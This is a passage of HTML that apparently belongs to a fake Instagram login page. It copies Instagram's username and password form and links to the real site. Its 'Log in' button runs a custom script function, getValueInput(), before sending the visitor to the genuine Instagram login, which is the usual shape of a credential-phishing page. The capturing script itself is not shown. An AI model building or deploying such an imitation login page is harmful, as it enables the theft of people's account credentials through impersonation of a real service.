            <div class="form-content">
              <input type="text" id="username" required />
              <label for="uname">Phone number, username, or email</label>
            </div>
            <div class="form-content">
              <input type="password" id="password" required />
              <label for="password">Password</label>
            </div>
            <div class="form-content">
              <a href="https://www.instagram.com/accounts/login/?hl=en"><button type="button" onclick="getValueInput()">Log in</button></a>
		
            </div>
            <div class="form-ending">
              <center>
                <p id="OR">OR</p>
                <span id="line"></span>
              </center>
              <p id="facebook"><i class="fab fa-facebook-square"></i>Login with Facebook</p>
              <a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
            </div>
          </form>
        </div>
        <div class="mini-box">
          <div class="text">Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></div>

        <div class="download-section">
